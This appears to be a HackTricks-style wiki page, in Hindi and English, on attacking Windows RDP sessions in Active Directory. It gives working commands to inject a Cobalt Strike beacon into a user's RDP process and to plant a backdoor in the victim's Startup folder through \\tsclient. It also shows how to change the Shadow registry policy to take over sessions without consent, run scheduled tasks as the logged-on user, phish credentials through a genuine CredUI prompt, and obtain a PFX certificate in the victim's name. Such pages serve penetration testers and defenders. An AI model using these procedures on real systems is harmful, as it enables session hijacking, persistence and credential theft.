# RDP सत्रों का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

यदि वर्तमान डोमेन में किसी भी **कंप्यूटर** पर **बाहरी समूह** के पास **RDP access** है, तो एक **हमलावर** **उस कंप्यूटर को समझौता कर सकता है और उस उपयोगकर्ता के आने तक प्रतीक्षा कर सकता है**।

एक बार जब वह उपयोगकर्ता RDP के माध्यम से एक्सेस कर लेता है, तो **हमलावर उस उपयोगकर्ता के session में pivot कर सकता है** और बाहरी डोमेन में इसकी अनुमतियों का दुरुपयोग कर सकता है।
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
जाँचें **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

यदि कोई उपयोगकर्ता **RDP into a machine** के माध्यम से किसी मशीन में पहुँचता है जहाँ एक **attacker** उसके लिए **waiting** कर रहा है, तो वह **attacker** सक्षम होगा कि वह **inject a beacon in the RDP session of the user** और यदि **victim mounted his drive** जब RDP के माध्यम से access कर रहा था, तो **attacker could access it**।

इस मामले में आप बस **compromise** the **victims** **original computer** by writing a **backdoor** in the **statup folder**।
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

यदि आप उस होस्ट पर **local admin** हैं जहाँ पीड़ित के पास पहले से एक **active RDP session** है, तो आप संभवतः **view/control that desktop without stealing the password or dumping LSASS** कर सकते हैं।

यह **Remote Desktop Services shadowing** नीति में स्टोर होने पर निर्भर करता है:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
दिलचस्प मान:

- `0`: अक्षम
- `1`: `EnableInputNotify` (नियंत्रण, उपयोगकर्ता की स्वीकृति आवश्यक)
- `2`: `EnableInputNoNotify` (नियंत्रण, **उपयोगकर्ता की स्वीकृति नहीं**)
- `3`: `EnableNoInputNotify` (केवल अवलोकन, उपयोगकर्ता की स्वीकृति आवश्यक)
- `4`: `EnableNoInputNoNotify` (केवल अवलोकन, **उपयोगकर्ता की स्वीकृति नहीं**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
यह विशेष रूप से उपयोगी होता है जब कोई privileged user जो RDP के माध्यम से जुड़ा हुआ था, एक अनलॉक किया हुआ desktop, KeePass session, MMC console, browser session, या admin shell खुला छोड़ दिया हो।

## Scheduled Tasks As Logged-On User

यदि आप **local admin** हैं और लक्षित उपयोगकर्ता **वर्तमान में logged on** है, तो Task Scheduler बिना उनके पासवर्ड के उस उपयोगकर्ता के रूप में code शुरू कर सकता है।

यह पीड़ित के मौजूदा logon session को एक execution primitive में बदल देता है:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
नोट:

- यदि उपयोगकर्ता **लॉग इन नहीं है**, तो Windows आमतौर पर उस उपयोगकर्ता के रूप में चलने वाला टास्क बनाने के लिए पासवर्ड की आवश्यकता करता है।
- यदि उपयोगकर्ता **लॉग इन है**, तो टास्क मौजूदा लॉगऑन संदर्भ को पुन: उपयोग कर सकता है।
- यह GUI कार्रवाइयों को निष्पादित करने या पीड़ित सत्र के अंदर बाइनरी लॉन्च करने का एक व्यावहारिक तरीका है बिना LSASS को छुए।

## CredUI Prompt Abuse — पीड़ित सत्र से

एक बार जब आप पीड़ित के इंटरैक्टिव डेस्कटॉप के भीतर निष्पादन कर सकें (उदाहरण के लिए **Shadow RDP** या **उस उपयोगकर्ता के रूप में चल रहे एक scheduled task** के माध्यम से), तो आप CredUI APIs का उपयोग करके एक वास्तविक Windows credential prompt दिखा सकते हैं और पीड़ित द्वारा दर्ज की गई क्रेडेंशियल्स को इकठ्ठा कर सकते हैं।

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

सामान्य प्रवाह:

1. पीड़ित सत्र में एक बाइनरी लॉन्च करें।
2. वर्तमान डोमेन ब्रांडिंग से मेल खाने वाला एक domain-authentication prompt दिखाएँ।
3. वापस प्राप्त auth buffer को अनपैक करें।
4. प्रदान की गई क्रेडेंशियल्स को मान्य करें और वैकल्पिक रूप से तब तक prompt दिखाते रहें जब तक वैध क्रेडेंशियल्स दर्ज न हों।

यह **on-host phishing** के लिए उपयोगी है क्योंकि यह प्रॉम्प्ट नकली HTML फॉर्म के बजाय मानक Windows APIs द्वारा रेंडर किया जाता है।

## Requesting a PFX — पीड़ित संदर्भ में

वही **scheduled-task-as-user** primitive उस लॉग-ऑन किए हुए पीड़ित के लिए **certificate/PFX** अनुरोध करने में इस्तेमाल किया जा सकता है। उस प्रमाणपत्र का बाद में उस उपयोगकर्ता के रूप में **AD authentication** के लिए उपयोग किया जा सकता है, जिससे पासवर्ड चोरी पूरी तरह टल सकती है।

उच्च-स्तरीय प्रवाह:

1. उस होस्ट पर **local admin** हासिल करें जहाँ पीड़ित लॉग-ऑन है।
2. एक **scheduled task** का उपयोग करके पीड़ित के रूप में enrollment/export लॉजिक चलाएँ।
3. प्राप्त **PFX** को एक्स्पोर्ट करें।
4. PKINIT / certificate-based AD authentication के लिए PFX का उपयोग करें।

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
